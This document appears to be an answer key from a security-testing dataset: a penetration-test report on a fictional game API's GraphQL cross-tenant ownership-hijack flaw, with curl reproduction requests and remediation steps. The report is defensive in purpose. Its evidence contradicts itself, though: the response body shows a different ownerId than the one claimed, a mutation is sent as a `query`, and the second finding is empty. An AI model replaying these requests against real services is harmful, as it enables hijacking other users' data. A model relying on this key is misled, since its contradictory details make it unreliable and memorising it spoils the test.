# Expected Response

## System
- **Name:** RealmForge Game API
- **Domain:** Gaming / MMO Backend
- **Example ID:** GQL-0032
- **Architecture:** WebSocket + REST + GraphQL economy

---

## Priority Findings

### Finding 1 — GraphQL Write BOLA + Mass Assignment: Cross-Tenant Character Ownership Hijack (Pattern 1.12 — Mass assignment via object fields)
**Severity:** Critical
**Affected endpoint:** `POST https://api.realmforge-game-api.example.com/graphql` (mutation `updateCharacter`)
**Referenced in context:** Section 4.0 (RISK-GQL-032), Section 5.0 (Pattern 1.12), HAR trace

**Summary:**
The `updateCharacter` mutation accepts `ownerId` (and `tenantId`) as writable fields in the `CharacterInput` type (Section 5.0: "the mutation accepts `ownerId` and `tenantId` as writable fields in the input, allowing mass assignment of ownership attributes"). Combined with the missing `tenantId` check (RISK-GQL-032), an attacker from `tenant-be1a` can:
1. Target a game character `C-2032` belonging to `tenant-d999`
2. Change the character's `ownerId` to an attacker-controlled value (`attacker-be1ad999`)
3. Effectively hijack ownership of a cross-tenant game character

**Evidence from HAR:**
- Request header `x-tenant-id: tenant-be1a` — attacker's tenant
- Request mutation: `updateCharacter(id: "C-2032", input: {status: "approved", ownerId: "attacker-be1ad999"})` — character `C-2032` belongs to `tenant-d999`
- The mutation input overwrites `ownerId` to `"attacker-be1ad999"` — mass assignment of ownership field
- Response: `200 OK`, `x-request-id: req-be1ad999`
- Response body: `tenantId: "tenant-d999"` — the update was executed on a cross-tenant character
- Response body: `ownerId: "other-user-be1ad999"` — character ownerId was mutated

---

### Finding 2 — `bulkCharacterLookup` Cross-Tenant Enumeration
**Severity:** Critical
**Affected endpoint:** `POST https://api.realmforge-game-api.example.com/graphql` (mutation `bulkCharacterLookup`)
**Referenced in context:** Section 4.0

---

## Steps to Reproduce

**Step 1 — Establish baseline (attacker's own character)**
```bash
curl -s -X POST https://api.realmforge-game-api.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-be1a" \
  -d '{"query": "mutation { updateCharacter(id: \"C-1032\", input: {status: \"active\"}) { characterId tenantId ownerId status } }"}'
```
Expected baseline: `tenantId: "tenant-be1a"` — attacker's own character updated.

**Step 2 — Cross-tenant mutation with mass assignment (exact HAR replay)**
```bash
curl -s -X POST https://api.realmforge-game-api.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-be1a" \
  -d '{"query": "query VulnerableOp { updateCharacter(id: \"C-2032\", input: {status: \"approved\", ownerId: \"attacker-be1ad999\"}) { characterId status } }"}'
```
**Vulnerable outcome (confirmed by HAR):**
- Response: `200 OK`
- Response body shows character `C-2032` (owned by `tenant-d999`) was successfully mutated
- `ownerId` overwritten to `"attacker-be1ad999"` — game character ownership hijacked
- In a gaming context, this allows the attacker to claim rare/high-value characters belonging to other game studios or players

**Secure outcome:**
```json
{ "errors": [{ "message": "Forbidden", "extensions": { "code": "FORBIDDEN" } }], "data": { "updateCharacter": null } }
```

---

## Remediation

1. **Resolver-level tenant check:** Before executing `updateCharacter`, verify `WHERE character_id = $id AND tenant_id = $jwtTenantId`.

2. **Remove `ownerId` and `tenantId` from `CharacterInput`:** These are ownership attributes that must only be writable by the system, not by clients. Strip them from the public input type.

3. **Bulk filter by JWT tenant:** `bulkCharacterLookup` must filter by `tenant_id = $jwtTenantId`.

4. **Cache key includes tenant dimension:** Redis key should be `characterId:tenantId` (per Section 2.0).
